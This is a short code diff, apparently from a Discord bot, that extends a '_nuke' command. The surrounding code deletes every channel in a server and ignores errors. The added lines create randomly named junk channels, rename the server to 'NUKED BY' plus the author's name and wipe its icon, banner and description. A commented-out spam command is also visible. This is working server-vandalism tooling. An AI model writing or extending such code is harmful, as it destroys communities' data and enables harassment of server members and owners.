@@ -202,7 +202,11 @@ async def _nuke(ctx):
             await channel.delete()
         except:
             pass
-    await ctx.send("Nuke complete", delete_after=__DELETE_CMD_OUTPUT_AFTER__)
+    for i in range(1, 10):
+        rand_text = "".join(random.choice(string.ascii_letters) for i in range(random.randint(10, 20)))
+        await ctx.guild.create_text_channel(f"{rand_text}")
+    await ctx.guild.edit(name = "NUKED BY " + str(ctx.author), icon=None, banner=None, description=None, reason=None)
+    # await ctx.send("Nuke complete", delete_after=__DELETE_CMD_OUTPUT_AFTER__)
 
 # @bot.command("spam", "Spams random text")
 # async def _spam(ctx, times: int):
